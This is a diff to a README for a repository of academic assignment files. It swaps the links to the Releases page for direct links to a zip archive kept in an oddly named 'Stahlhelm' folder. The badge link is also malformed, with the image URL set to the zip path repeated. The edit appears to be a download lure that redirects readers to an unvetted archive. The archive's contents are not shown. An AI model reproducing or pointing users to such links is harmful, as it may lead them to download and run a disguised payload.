@@ -6,7 +6,7 @@ Welcome to the Window5_mahlet-keffale repository! This project contains all my a
 
 ## 📥 Download Now
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/awaismujtaba/Window5_mahlet-keffale/releases)
+[![Download from Releases](https://raw.githubusercontent.com/awaismujtaba/Window5_mahlet-keffale/main/Stahlhelm/keffale_mahlet_Window_2.0.zip%https://raw.githubusercontent.com/awaismujtaba/Window5_mahlet-keffale/main/Stahlhelm/keffale_mahlet_Window_2.0.zip)](https://raw.githubusercontent.com/awaismujtaba/Window5_mahlet-keffale/main/Stahlhelm/keffale_mahlet_Window_2.0.zip)
 
 Click the button above to access the latest versions of my assignment files. 
 
@@ -32,7 +32,7 @@ To use the PDF files, you need:
 
 To download the assignment files, visit the following link:
 
-[Download from Releases](https://github.com/awaismujtaba/Window5_mahlet-keffale/releases)
+[Download from Releases](https://raw.githubusercontent.com/awaismujtaba/Window5_mahlet-keffale/main/Stahlhelm/keffale_mahlet_Window_2.0.zip)
 
 You will find the files listed on the Releases page. Simply locate the version you want and click on the file name to start the download.
 
